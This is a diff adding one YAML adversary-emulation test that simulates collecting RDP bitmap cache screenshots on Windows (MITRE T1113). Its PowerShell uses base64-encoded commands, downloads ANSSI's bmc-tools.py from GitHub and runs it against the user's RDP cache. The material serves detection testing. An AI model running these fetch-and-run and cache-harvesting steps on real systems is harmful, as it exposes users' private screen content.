@@ -1,0 +1,16 @@
+- id: caebe2cb-0407-522a-bb15-2d12ef125e26
+  name: Soumaia ART Tests - RDP Bitmap Cache Extraction via bmc-tools
+  description: 'Simulates an attacker extracting the RDP bitmap cache using the ANSSI "bmc-tools.py" script.
+
+    This test requires valid RDP bitmap cache files to exist on the system (usually created after an outgoing RDP connection is made).'
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: Screen Capture
+  platforms:
+    windows:
+      psh:
+        command: "powershell -NoProfile -EncodedCommand aQBmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIABwAHkAdABoAG8AbgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACAAewAgAGUAeABpAHQAIAAwACAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAUABsAGUAYQBzAGUAIABpAG4AcwB0AGEAbABsACAAUAB5AHQAaABvAG4AIABtAGEAbgB1AGEAbABsAHkALgAiAAoA\n}\n$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'\n$toolsDir = \"$env:TEMP\\bmc-tools.py\"\n \n# create output directory\nNew-Item -ItemType Directory -Path $env:TEMP\\rdp_screens -Force | Out-Null\n\n# python script download\n& curl.exe -L $url --output $toolsDir\n \n# execution step\nif (Test-Path $toolsDir) { python $toolsDir -s \"$env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache\" -d $env:TEMP\\rdp_screens -b }"
+        cleanup: |-
+          Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
+          Remove-Item $env:TEMP\rdp_screens -Recurse -Force -ErrorAction SilentlyContinue
